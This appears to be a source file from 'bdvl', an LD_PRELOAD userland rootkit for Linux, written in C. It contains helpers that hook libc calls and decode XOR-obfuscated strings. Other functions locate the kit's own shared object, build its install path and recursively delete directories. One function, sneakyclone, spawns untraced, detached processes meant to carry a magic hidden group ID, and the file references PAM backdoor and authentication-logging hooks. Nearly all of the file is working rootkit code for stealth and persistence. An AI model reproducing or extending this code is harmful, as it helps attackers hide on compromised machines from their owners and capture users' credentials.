/* recursively removes the target directory. */
int eradicatedir(const char *target){
    DIR *dp;
    struct dirent *dir;

    hook(COPENDIR, CREADDIR, CRMDIR, C__LXSTAT);

    dp = call(COPENDIR, target);
    if(dp == NULL) return -1;

    const size_t targetlen = strlen(target);
    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;
        char path[targetlen + strlen(dir->d_name) + 2];
        fillbuf(path, "%s/%s", target, dir->d_name);
        struct stat pathstat;
        memset(&pathstat, 0, sizeof(struct stat));
        if((long)call(C__LXSTAT, _STAT_VER, path, &pathstat) != -1)
            rm(path);
    }
    closedir(dp);
    call(CRMDIR, target);
    return 0;
}

int rm(const char *path){
    hook(CUNLINK);
    int ulr = (long)call(CUNLINK, path);
    if(ulr < 0 && errno == ENOENT) return 1;
    else if(ulr < 0 && errno == EISDIR){
        eradicatedir(path);
        return 1;
    }
    return ulr;
}

int chownpath(const char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, gid, gid);
}

int notuser(uid_t id){
    return getuid() != id && geteuid() != id;
}

int isfedora(void){
    char *relpath;
    int acc;
    hook(CACCESS);
    relpath = xordup(FED_REL_PATH);
    if(!relpath) return -1;
    acc = (long)call(CACCESS, relpath, F_OK);
    clean(relpath);
    return acc == 0;
}

/* iterates through all loaded libraries until bdvl.so is located.
 * once located, the struct passed as an argument to the void pointer is populated with information of the located bdvl.so. */
int phdrcallback(struct dl_phdr_info *info, size_t size, void *data){
    bdvso_t *bso = (bdvso_t*)data;
    void *handle = NULL, (*fptr)(void)=NULL;
    char *targetdup, *pathdir, *fname;
    const char *target = info->dlpi_name;

    if(!strlen(target) || (handle = dlopen(target, RTLD_LAZY)) == NULL)
        return 0;

    locate_dlsym();
    fname = xordup(RLLYGAY);
    if(!fname){
        dlclose(handle);
        return 0;
    }
    fptr = o_dlsym(handle, fname);
    clean(fname);
    dlclose(handle);
    if(fptr == NULL) return 0;

    writeover(bso->sopath, target);
    bso->sopathlen = strlen(target);

    const char *name = strrchr(target, '/') + 1;
    writeover(bso->soname, name);
    bso->sonamelen = strlen(name);
    
    targetdup = strdup(target);
    if(!targetdup) return 0;
    pathdir = dirname(targetdup);
    writeover(bso->installdir, pathdir);
    bso->installdirlen = strlen(pathdir);
    clean(targetdup);

    return 0;
}

/* populates & returns a new pointer to a bdvso struct. thanks to dl_iterate_phdr.
 * the pointer should be freed immediately after there is no longer any use for it. */
bdvso_t *getbdvsoinf(void){
    bdvso_t *so = calloc(1, sizeof(bdvso_t));
    if(!so) return NULL;
    hook(CDL_ITERATE_PHDR);
    call(CDL_ITERATE_PHDR, phdrcallback, (void*)so);
    return so;
}

#define fallbackbuf(BUF, INSTALLDIR, BDVLSO) snprintf(BUF, sizeof(BUF)-1, "%s/%s.$PLATFORM", INSTALLDIR, BDVLSO)

/* returns the full sopath for the kit.
 * if pointers installdir & bdvlso are NULL, the path of the kit is stored & read from in the bdvso struct, which is populated by dl_iterate_phdr.
 * if the path cannot be found, INSTALL_DIR & BDVLSO are used as fallbacks.
 * otherwise if installdir & bdvlso are not NULL, they are used. (i.e. at installation)
 * if box is fedora, .$PLATFORM is not included in the result. */
char *rksopath(const char *installdir, const char *bdvlso){
    size_t pathsize;
    char *ret, tmp[2048];
    memset(tmp, 0, sizeof(tmp));

    if(installdir == NULL && bdvlso == NULL){
        bdvso_t *so = getbdvsoinf();
        if(so == NULL){
            if(!initmvbc()) return NULL;
            fallbackbuf(tmp, mvbc->installdir, mvbc->bdvlso);
            goto nopenope;
        }

        char *sopath = so->sopath;
        const char *platform = strrchr(sopath, '.') + 1;

        int s = 1;
        for(size_t i=0; i<VALID_PLATFORMS_SIZE && s != 0; i++){
            char *pf = xordup(valid_platforms[i]);
            if(!pf){
                sree(so);
                if(!initmvbc()) return NULL;
                fallbackbuf(tmp, mvbc->installdir, mvbc->bdvlso);
                goto nopenope;
            }
            s = strcmp(pf, platform);
            const size_t pflen = strlen(pf);
            clean(pf);
            if(s == 0)
                sopath[so->sopathlen - (pflen + 1)] = '\0';
        }

        strncpy(tmp, sopath, sizeof(tmp)-1);
        strcat(tmp, ".$PLATFORM");
        tmp[so->sopathlen + 10]='\0'; 
        sree(so);
    }else fallbackbuf(tmp, installdir, bdvlso);
nopenope:
    pathsize = strlen(tmp)+1;
    ret = strdup(tmp);
    ret && isfedora() ? ret[pathsize-11]='\0' : 0;
    return ret;
}

char *gdirname(int fd, ssize_t *dlen){
    char *filename = calloc(1, PATH_MAX+1);
    if(!filename) return NULL;

    char path[128];
    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    ssize_t rb = (ssize_t)call(CREADLINK, path, filename, PATH_MAX);
    if(!rb){
        free(filename);
        filename = NULL;
    }else{
        if(dlen != NULL)
            *dlen = rb;
        filename[rb] = '\0';
    }
    return filename;
}

#if defined(USE_PAM_BD) || defined(PAM_AUTH_LOGGING)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}
#endif

/* creates a new process for whatever function fn points to.
 * passes arg along with it. once cloned, the target function
 * must setgid(MAGIC_GID) immediately if the calling process can.
 * the new process does not share memory with the parent therefore has its own stack. 
 * hence we free the allocated stack immediately after cloning. */
int sneakyclone(int (*fn)(void*), void *arg, const size_t stacksize){
    if(getpid() == 1 || getppid() == 1)
        return 0;

    void *stack, *sptr;
    unsigned long flags = CLONE_UNTRACED|CLONE_DETACHED|CLONE_PARENT;
    int ret;

    stack = malloc(stacksize);
    if(!stack) return 0;
    sptr = stack+stacksize;

    ret = clone(fn, sptr, flags, arg);
    free(stack);
    return ret;
}